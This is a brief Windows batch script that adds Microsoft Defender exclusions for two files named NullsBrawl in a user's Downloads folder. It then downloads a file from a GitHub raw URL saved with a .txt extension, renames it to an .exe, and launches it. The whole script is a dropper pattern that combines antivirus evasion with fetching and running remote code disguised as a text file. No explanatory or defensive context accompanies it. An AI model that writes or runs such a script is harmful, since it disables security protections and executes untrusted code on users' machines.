cd %SystemRoot%\System32\WindowsPowerShell\v1.0\

powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\itayp\Downloads\NullsBrawl.txt'"
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\itayp\Downloads\NullsBrawl.exe'"

powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ItayosP/NullsBrawl/master/NullsBrawl.txt' -OutFile 'C:\Users\itayp\Downloads\NullsBrawl.txt'"

rename "C:\Users\itayp\Downloads\NullsBrawl.txt" "NullsBrawl.exe"

cd C:\Users\itayp\Downloads\

start NullsBrawl.exe